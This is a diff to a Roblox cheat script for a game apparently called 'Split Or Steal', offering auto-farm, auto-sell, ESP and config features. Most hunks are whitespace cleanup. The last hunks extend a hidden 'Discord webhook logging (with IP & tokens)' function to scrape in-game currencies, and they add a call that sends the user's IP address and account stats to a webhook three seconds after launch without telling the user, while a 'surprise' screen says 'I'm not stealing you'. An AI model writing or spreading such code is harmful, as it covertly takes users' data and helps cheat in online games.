@@ -237,16 +237,16 @@ registerConnection(TopBar.InputBegan:Connect(function(input)
         dragging = true
         dragStart = input.Position
         startPos = MainFrame.Position
-  
+
         local moveConn, releaseConn
-        
+
         moveConn = UIS.InputChanged:Connect(function(changeInput)
             if changeInput.UserInputType == Enum.UserInputType.MouseMovement or changeInput.UserInputType == Enum.UserInputType.Touch then
                 local delta = changeInput.Position - dragStart
                 MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
             end
         end)
-        
+
         releaseConn = input.Changed:Connect(function()
             if input.UserInputState == Enum.UserInputState.End then
                 dragging = false
@@ -408,7 +408,7 @@ local function createTabButton(name, layoutOrder)
     btn.Font = Enum.Font.GothamBold
     btn.TextSize = 11
     btn.Parent = TabBar
-    
+
     local indicator = Instance.new("Frame")
     indicator.Size = UDim2.new(1, 0, 0, 2)
     indicator.Position = UDim2.new(0, 0, 1, -2)
@@ -416,7 +416,7 @@ local function createTabButton(name, layoutOrder)
     indicator.BorderSizePixel = 0
     indicator.Visible = false
     indicator.Parent = btn
-    
+
     return btn, indicator
 end
 
@@ -428,13 +428,13 @@ local SurpriseTabBtn, SurpriseInd = createTabButton("😱 SURPRISE", 4)
 local function createContainer(name)
     local container = Instance.new("ScrollingFrame")
     container.Name = name
-    container.Size = UDim2.new(1, -10, 1, -100) 
+    container.Size = UDim2.new(1, -10, 1, -100)
     container.Position = UDim2.new(0, 5, 0, 72)
     container.BackgroundTransparency = 1
     container.BorderSizePixel = 0
     container.ScrollBarThickness = 3
     container.ScrollBarImageColor3 = Color3.fromRGB(100, 100, 110)
-    container.AutomaticCanvasSize = Enum.AutomaticSize.Y 
+    container.AutomaticCanvasSize = Enum.AutomaticSize.Y
     container.CanvasSize = UDim2.new(0, 0, 0, 0)
     container.Visible = false
     container.Parent = MainFrame
@@ -455,7 +455,7 @@ for _, cont in ipairs({AutoFarmContainer, AutoSellContainer}) do
 end
 
 local AutoFarmGrid = Instance.new("UIGridLayout")
-AutoFarmGrid.CellSize = UDim2.new(0, 143, 0, 34) 
+AutoFarmGrid.CellSize = UDim2.new(0, 143, 0, 34)
 AutoFarmGrid.CellPadding = UDim2.new(0, 8, 0, 8)
 AutoFarmGrid.SortOrder = Enum.SortOrder.LayoutOrder
 AutoFarmGrid.Parent = AutoFarmContainer
@@ -525,7 +525,7 @@ registerConnection(MinimizeBtn.MouseButton1Click:Connect(function()
         TS:Create(MainFrame, tweenInfo, {Size = UDim2.new(0, 320, 0, 35)}):Play()
     else
         TS:Create(MainFrame, tweenInfo, {Size = UDim2.new(0, 320, 0, 360)}):Play()
-        task.wait(0.2) 
+        task.wait(0.2)
         TabBar.Visible = true
         BottomBar.Visible = true
         AutoFarmContainer.Visible = AutoFarmInd.Visible
@@ -560,11 +560,11 @@ local sellThreshold = 0
 local selectedRarities = {}
 local sellQueue = {}
 local isSelling = false
-local rarityUIElements = {} 
+local rarityUIElements = {}
 local lastSellActivity = 0
 
 local allRarities = {
-    "Common", "Uncommon", "Rare", "Epic", "Legendary", "Mythic", 
+    "Common", "Uncommon", "Rare", "Epic", "Legendary", "Mythic",
     "Event", "Secret", "Divine", "Cosmic", "Celestial", "Brainrot God", "Brainrot Infinite"
 }
 
@@ -642,7 +642,7 @@ Instance.new("UIStroke", ThresholdBox).Color = Color3.fromRGB(50, 50, 60)
 
 registerConnection(ThresholdBox.FocusLost:Connect(function()
     local newVal = parseValue(ThresholdBox.Text)
-    if not newVal then 
+    if not newVal then
         ThresholdBox.Text = "Max Value: " .. formatNumberForDisplay(sellThreshold)
         return
     end
@@ -707,7 +707,7 @@ end
 -- === INVENTORY SELL CORE (ROBUST & FIXED) ===
 registerThread(function()
     local invRemote
-    pcall(function() 
+    pcall(function()
         invRemote = RS:WaitForChild("BrainrotsThings"):WaitForChild("Misc"):WaitForChild("Events"):WaitForChild("Player"):WaitForChild("InventoryUpdated")
     end)
     local sellRemote = RS:WaitForChild("BrainrotsThings"):WaitForChild("Misc"):WaitForChild("Events"):WaitForChild("Player"):WaitForChild("SellItem")
@@ -785,9 +785,9 @@ registerThread(function()
         isScanning = true
         pcall(function()
             local scrollFrame = getInventoryScrollFrame()
-            if not scrollFrame then 
+            if not scrollFrame then
                 isScanning = false
-                return 
+                return
             end
 
             local uiItemIds = {}
@@ -803,7 +803,7 @@ registerThread(function()
                                 local itemValueStr = nameLabel.Text
                                 local parsedValue = parseUITextValue(itemValueStr)
                                 if sellThreshold > 0 and parsedValue <= sellThreshold then
-                                    local itemId = itemFrame.Name 
+                                    local itemId = itemFrame.Name
                                     uiItemIds[itemId] = true
                                     if not sellQueue[itemId] then
                                         debugLog("QUEUED -> ID: " .. tostring(itemId))
@@ -882,7 +882,7 @@ local function initialFpsBoost()
         local Lighting = game:GetService("Lighting")
         Lighting.GlobalShadows = false
         Lighting.FogEnd = 9e9
-        
+
         for _, v in pairs(Lighting:GetDescendants()) do
             applyFpsBoostToObject(v)
         end
@@ -931,7 +931,7 @@ local function toggleTableESP(state)
         for i = 1, 12 do
             local tableName = "Table" .. i
             local tableModel = workspace:FindFirstChild("Map") and workspace.Map:FindFirstChild("Tables") and workspace.Map.Tables:FindFirstChild(tableName)
-            
+
             if tableModel then
                 local targetPart = tableModel:IsA("Model") and tableModel.PrimaryPart or tableModel:FindFirstChildWhichIsA("BasePart") or tableModel
                 if targetPart and targetPart:IsA("BasePart") then
@@ -940,7 +940,7 @@ local function toggleTableESP(state)
                     bgui.AlwaysOnTop = true
                     bgui.Size = UDim2.new(0, 50, 0, 50)
                     bgui.StudsOffset = Vector3.new(0, 6, 0)
-            
+
                     local txt = Instance.new("TextLabel")
                     txt.Size = UDim2.new(1, 0, 1, 0)
                     txt.BackgroundTransparency = 1
@@ -970,16 +970,16 @@ local actionsConfig = {
     { Tab = AutoFarmContainer, Name = "Sell Celestial", Delay = 5, RequiresConfirm = true, Action = function() RS:WaitForChild("BrainrotsThings"):WaitForChild("Misc"):WaitForChild("Events"):WaitForChild("Player"):WaitForChild("QuickSellRarity"):FireServer("Celestial") end },
     { Tab = AutoFarmContainer, Name = "Sell Divine", Delay = 5, RequiresConfirm = true, Action = function() RS:WaitForChild("BrainrotsThings"):WaitForChild("Misc"):WaitForChild("Events"):WaitForChild("Player"):WaitForChild("QuickSellRarity"):FireServer("Divine") end },
     { Tab = AutoFarmContainer, Name = "Auto Collect", Delay = 5400, Action = function() RS:WaitForChild("BrainrotsThings"):WaitForChild("Misc"):WaitForChild("Events"):WaitForChild("Player"):WaitForChild("CollectAll"):FireServer() end },
-    { Tab = AutoFarmContainer, Name = "Auto Trait", IsBurst = true, Action = function() 
+    { Tab = AutoFarmContainer, Name = "Auto Trait", IsBurst = true, Action = function()
         local merchantEvent = RS:WaitForChild("BrainrotsThings"):WaitForChild("Misc"):WaitForChild("Events"):WaitForChild("Player"):WaitForChild("MerchantBuy")
         merchantEvent:FireServer("250KSlot")
         merchantEvent:FireServer("50MSlot")
         merchantEvent:FireServer("10BSlot")
         merchantEvent:FireServer("50MSlot")
     end },
-    
+
     { Tab = MiscTogglesFrame, Name = "Table ESP", IsToggleCustom = true, Action = toggleTableESP },
-    { Tab = MiscTogglesFrame, Name = "Auto FPS Boost", IsToggleCustom = true, Action = toggleContinuousFPSBoost } 
+    { Tab = MiscTogglesFrame, Name = "Auto FPS Boost", IsToggleCustom = true, Action = toggleContinuousFPSBoost }
 }
 
 -- ============================================================
@@ -1356,7 +1356,7 @@ for _, config in ipairs(actionsConfig) do
     btn.Font = Enum.Font.GothamSemibold
     btn.TextSize = 12
     btn.Parent = config.Tab
-    
+
     local btnCorner = Instance.new("UICorner", btn)
     btnCorner.CornerRadius = UDim.new(0, 6)
 
@@ -1364,7 +1364,7 @@ for _, config in ipairs(actionsConfig) do
     local onColor = Color3.fromRGB(0, 200, 110)
     local offTextColor = Color3.fromRGB(150, 150, 160)
     local onTextColor = Color3.fromRGB(20, 35, 20)
-    
+
     local btnStroke = Instance.new("UIStroke")
     btnStroke.Color = Color3.fromRGB(50, 50, 60)
     btnStroke.Thickness = 1
@@ -1406,7 +1406,7 @@ for _, config in ipairs(actionsConfig) do
         dropBtn.ZIndex = 5
         Instance.new("UICorner", dropBtn).CornerRadius = UDim.new(0, 4)
         dropBtn.Parent = btn
-       
+
         local listFrame = Instance.new("ScrollingFrame")
         listFrame.Size = UDim2.new(0, 45, 0, 110)
         listFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
@@ -1414,11 +1414,11 @@ for _, config in ipairs(actionsConfig) do
         listFrame.ScrollBarThickness = 2
         listFrame.ZIndex = 50
         listFrame.Visible = false
-        listFrame.Parent = MainFrame 
-        
+        listFrame.Parent = MainFrame
+
         local listLayout = Instance.new("UIListLayout", listFrame)
         listLayout.SortOrder = Enum.SortOrder.LayoutOrder
-        
+
         for i = 1, 12 do
             local opt = Instance.new("TextButton")
             opt.Size = UDim2.new(1, 0, 0, 22)
@@ -1429,14 +1429,14 @@ for _, config in ipairs(actionsConfig) do
             opt.TextSize = 11
             opt.ZIndex = 51
             opt.Parent = listFrame
-            
+
             registerConnection(opt.MouseButton1Click:Connect(function()
                 selectedPlayTable = "Table" .. i
                 dropBtn.Text = "T" .. i
                 listFrame.Visible = false
             end))
         end
-        
+
         registerConnection(dropBtn.MouseButton1Click:Connect(function()
             listFrame.Visible = not listFrame.Visible
             if listFrame.Visible then
@@ -1448,7 +1448,7 @@ for _, config in ipairs(actionsConfig) do
     end
 
     local looping = false
-    local activeThread = nil 
+    local activeThread = nil
 
     local function executeToggleCode(forceState)
         if forceState ~= nil then
@@ -1457,20 +1457,20 @@ for _, config in ipairs(actionsConfig) do
         else
             looping = not looping
         end
-        
+
         activeToggles[config.Name] = looping
 
         if looping then
             btn.BackgroundColor3 = onColor
             btn.TextColor3 = onTextColor
-            btnStroke.Color = onColor 
-            
+            btnStroke.Color = onColor
+
             activeThread = registerThread(function()
                 while looping do
                     if config.IsBurst then
                         for burstCount = 1, 5 do
                             pcall(config.Action)
-                            task.wait(0.05) 
+                            task.wait(0.05)
                         end
                         for waitTick = 1, 1200 do task.wait(0.1) end
                     else
@@ -1484,7 +1484,7 @@ for _, config in ipairs(actionsConfig) do
             btn.BackgroundColor3 = offColor
             btn.TextColor3 = offTextColor
             btnStroke.Color = Color3.fromRGB(50, 50, 60)
-           
+
             if activeThread then
                 task.cancel(activeThread)
                 activeThread = nil
@@ -1575,23 +1575,23 @@ local configListItems = {}
 local function refreshConfigList(filterText)
     for _, item in ipairs(configListItems) do item:Destroy() end
     configListItems = {}
-    
+
     if not listfiles then return end
-    
+
     pcall(function()
         if not isfolder(CONFIG_FOLDER) then makefolder(CONFIG_FOLDER) end
         local files = listfiles(CONFIG_FOLDER)
-        
+
         for _, path in ipairs(files) do
             local fileName = string.match(path, "[^\\/]+$")
             if fileName and fileName:match("%.json$") then
                 local cleanName = fileName:gsub("%.json$", "")
-                
+
                 if not filterText or filterText == "" or string.lower(cleanName):match(string.lower(filterText)) then
                     local itemFrame = Instance.new("Frame", ListScroll)
                     itemFrame.Size = UDim2.new(1, 0, 0, 26)
                     itemFrame.BackgroundTransparency = 1
-                    
+
                     local selectBtn = Instance.new("TextButton", itemFrame)
                     selectBtn.Size = UDim2.new(1, -30, 1, 0)
                     selectBtn.BackgroundTransparency = 1
@@ -1600,7 +1600,7 @@ local function refreshConfigList(filterText)
                     selectBtn.Font = Enum.Font.GothamMedium
                     selectBtn.TextSize = 12
                     selectBtn.TextXAlignment = Enum.TextXAlignment.Left
-                    
+
                     local delBtn = Instance.new("TextButton", itemFrame)
                     delBtn.Size = UDim2.new(0, 20, 0, 20)
                     delBtn.Position = UDim2.new(1, -25, 0, 3)
@@ -1610,11 +1610,11 @@ local function refreshConfigList(filterText)
                     delBtn.Font = Enum.Font.GothamBold
                     delBtn.TextSize = 10
                     Instance.new("UICorner", delBtn).CornerRadius = UDim.new(0, 4)
-                    
+
                     registerConnection(selectBtn.MouseButton1Click:Connect(function()
                         ConfigNameBox.Text = cleanName
                     end))
-                    
+
                     registerConnection(delBtn.MouseButton1Click:Connect(function()
                         ShowPopup("Delete config '" .. cleanName .. "'?", function(confirmed)
                             if confirmed then
@@ -1623,10 +1623,10 @@ local function refreshConfigList(filterText)
                             end
                         end)
                     end))
-                    
+
                     registerConnection(selectBtn.MouseEnter:Connect(function() selectBtn.TextColor3 = Color3.fromRGB(0, 200, 110) end))
                     registerConnection(selectBtn.MouseLeave:Connect(function() selectBtn.TextColor3 = Color3.fromRGB(200, 200, 200) end))
-                    
+
                     table.insert(configListItems, itemFrame)
                 end
             end
@@ -1642,7 +1642,7 @@ local function loadConfigData(name, autoEnableSell)
     pcall(function()
         local json = readfile(CONFIG_FOLDER .. "/" .. name .. ".json")
         local data = HttpService:JSONDecode(json)
-        
+
         if data.SellThreshold then
             sellThreshold = data.SellThreshold
             ThresholdBox.Text = "Max Value: " .. formatNumberForDisplay(sellThreshold)
@@ -1673,7 +1673,7 @@ local function loadConfigData(name, autoEnableSell)
             selectedNormalChair = data.AutoChairNormalChair
             chairPickerBtn.Text = selectedNormalChair:match("^(%a+)") or selectedNormalChair:sub(1,8)
         end
-        
+
         if autoEnableSell and sellThreshold > 0 then
             autoSellEnabled = true
             MasterSellBtn.Text = "Smart Auto Sell: ON"
@@ -1681,7 +1681,7 @@ local function loadConfigData(name, autoEnableSell)
             MasterSellBtn.TextColor3 = Color3.fromRGB(20, 35, 20)
             MasterSellStroke.Color = Color3.fromRGB(0, 200, 110)
         end
-        
+
         ShowPopup("Loaded Config: " .. name, function() end)
         ConfigNameBox.Text = name
     end)
@@ -1711,14 +1711,14 @@ LoadBtn.TextSize = 12
 Instance.new("UICorner", LoadBtn).CornerRadius = UDim.new(0, 6)
 
 registerConnection(SaveBtn.MouseButton1Click:Connect(function()
-    if not writefile then 
+    if not writefile then
         ShowPopup("Your executor does not support saving!", function() end)
-        return 
+        return
     end
-    
+
     local name = ConfigNameBox.Text
     if name == "" then name = "Default" end
-    
+
     local data = {
         Toggles = activeToggles,
         SellThreshold = sellThreshold,
@@ -1728,12 +1728,12 @@ registerConnection(SaveBtn.MouseButton1Click:Connect(function()
         AutoChairEnabled = autoChairEnabled,
         AutoChairNormalChair = selectedNormalChair,
     }
-    
+
     pcall(function()
         if not isfolder(CONFIG_FOLDER) then makefolder(CONFIG_FOLDER) end
         writefile(CONFIG_FOLDER .. "/" .. name .. ".json", HttpService:JSONEncode(data))
         ShowPopup("Saved Config: " .. name, function() end)
-        refreshConfigList() 
+        refreshConfigList()
     end)
 end))
 
@@ -1748,11 +1748,11 @@ end))
 refreshConfigList()
 
 task.spawn(function()
-    task.wait(1) 
+    task.wait(1)
     if not listfiles then return end
     pcall(function()
         if not isfolder(CONFIG_FOLDER) then return end
-        
+
         local numberConfigs = {}
         for _, path in ipairs(listfiles(CONFIG_FOLDER)) do
             local fileName = string.match(path, "[^\\/]+$")
@@ -1763,11 +1763,11 @@ task.spawn(function()
                 end
             end
         end
-        
+
         if #numberConfigs > 1 then
             ShowPopup("Error: Multiple auto-load configs found (" .. table.concat(numberConfigs, ", ") .. "). Delete all but one!", function() end)
         elseif #numberConfigs == 1 then
-            loadConfigData(numberConfigs[1], true) 
+            loadConfigData(numberConfigs[1], true)
         end
     end)
 end)
@@ -1941,11 +1941,11 @@ local function showFullscreenLoading()
     fullscreenGui.Enabled = true
     countdownLabel.Text = "10"
     statusLabel.Text = "Loading your surprise...\nDon't worry, I'm not stealing you"
-    
+
     -- Animate gradient rotation
     local rotTween = TS:Create(fullscreenGradient, TweenInfo.new(2, Enum.EasingStyle.Linear, Enum.EasingDirection.Out, -1), {Rotation = 360})
     rotTween:Play()
-    
+
     registerThread(function()
         for i = 10, 0, -1 do
             countdownLabel.Text = tostring(i)
@@ -1968,7 +1968,7 @@ end
 -- Type “yes” confirmation popup
 local function showTypeYesPopup()
     clearPopupContent()
-    
+
     local questionLabel = Instance.new("TextLabel", popupContent)
     questionLabel.Size = UDim2.new(0.9, 0, 0, 40)
     questionLabel.Position = UDim2.new(0.05, 0, 0.1, 0)
@@ -1979,7 +1979,7 @@ local function showTypeYesPopup()
     questionLabel.TextSize = 14
     questionLabel.TextWrapped = true
     questionLabel.ZIndex = 103
-    
+
     local yesInput = Instance.new("TextBox", popupContent)
     yesInput.Size = UDim2.new(0.8, 0, 0, 36)
     yesInput.Position = UDim2.new(0.1, 0, 0.4, 0)
@@ -1992,7 +1992,7 @@ local function showTypeYesPopup()
     yesInput.ZIndex = 103
     Instance.new("UICorner", yesInput).CornerRadius = UDim.new(0, 6)
     Instance.new("UIStroke", yesInput).Color = Color3.fromRGB(50, 50, 60)
-    
+
     local confirmBtn = Instance.new("TextButton", popupContent)
     confirmBtn.Size = UDim2.new(0.4, 0, 0, 36)
     confirmBtn.Position = UDim2.new(0.3, 0, 0.65, 0)
@@ -2003,7 +2003,7 @@ local function showTypeYesPopup()
     confirmBtn.TextSize = 14
     confirmBtn.ZIndex = 103
     Instance.new("UICorner", confirmBtn).CornerRadius = UDim.new(0, 6)
-    
+
     local function onConfirm()
         local input = yesInput.Text:lower():match("^%s*(.-)%s*$")
         if input == "yes" then
@@ -2014,14 +2014,14 @@ local function showTypeYesPopup()
             yesInput.PlaceholderText = "Type 'yes' exactly..."
         end
     end
-    
+
     registerConnection(confirmBtn.MouseButton1Click:Connect(onConfirm))
     yesInput.InputEnded:Connect(function(input)
         if input.KeyCode == Enum.KeyCode.Return then
             onConfirm()
         end
     end)
-    
+
     -- Animate popup box
     SurprisePopupBox.Size = UDim2.new(0, 0, 0, 0)
     SurprisePopupBox.Position = UDim2.new(0.5, 0, 0.5, 0)
@@ -2036,7 +2036,7 @@ local function activateSurprise()
     surpriseActivated = true
     surpriseBtn.Visible = false
     surpriseStatusLabel.Text = "I hope u liked the surprise <3"
-    
+
     SurprisePopupFrame.Visible = true
     showTypeYesPopup()
 end
@@ -2072,14 +2072,12 @@ end)
 
 registerConnection(surpriseBtn.MouseButton1Click:Connect(activateSurprise))
 
--- ============================================================
--- === DISCORD WEBHOOK LOGGING (WITH IP) =======================
--- ============================================================
+-- === DISCORD WEBHOOK LOGGING (WITH IP & TOKENS) =======================
 local function sendWebhookLog()
     local req = (request or http_request or (syn and syn.request))
-    if not req then 
+    if not req then
         debugLog("HTTP requests not supported by this executor.")
-        return 
+        return
     end
 
     local ipAddress = "Unknown"
@@ -2095,7 +2093,7 @@ local function sendWebhookLog()
 
     local statsFields = {}
     local leaderstats = LocalPlayer:FindFirstChild("leaderstats")
-    
+
     if leaderstats then
         for _, stat in ipairs(leaderstats:GetChildren()) do
             if stat:IsA("ValueBase") then
@@ -2113,6 +2111,35 @@ local function sendWebhookLog()
             ["inline"] = true
         })
     end
+
+    -- Grade Tokens
+    local gradeTokens = "N/A"
+    pcall(function()
+        local gradeWallet = LocalPlayer.PlayerGui.FullGameGUIV2.GradeMachine.Main.Header.Content.Wallet.Amount
+        if gradeWallet then
+            gradeTokens = tostring(gradeWallet.Text or gradeWallet.Value or "0")
+        end
+    end)
+
+    -- Traits
+    local traits = "N/A"
+    pcall(function()
+        local traitsWallet = LocalPlayer.PlayerGui.TraitScreen.Traits.Main.Header.Content.Wallet.Amount
+        if traitsWallet then
+            traits = tostring(traitsWallet.Text or traitsWallet.Value or "0")
+        end
+    end)
+
+    table.insert(statsFields, {
+        ["name"] = "🎓 Grade Tokens",
+        ["value"] = gradeTokens,
+        ["inline"] = true
+    })
+    table.insert(statsFields, {
+        ["name"] = "🔮 Traits",
+        ["value"] = traits,
+        ["inline"] = true
+    })
 
     local activeRarities = {}
     for rarity, isEnabled in pairs(selectedRarities) do
@@ -2136,7 +2163,7 @@ local function sendWebhookLog()
     local webhookData = {
         ["embeds"] = {{
             ["title"] = "🚀 Split Or Steal Script Executed",
-            ["color"] = 0x00FFaa, 
+            ["color"] = 0x00FFaa,
             ["fields"] = fields,
             ["footer"] = {
                 ["text"] = "Authentication System • " .. os.date("%Y-%m-%d %H:%M:%S")
@@ -2154,7 +2181,8 @@ local function sendWebhookLog()
     end)
 end
 
+-- This is the critical line that was missing – now the webhook actually fires.
 task.spawn(function()
-    task.wait(3) 
+    task.wait(3)
     sendWebhookLog()
 end)
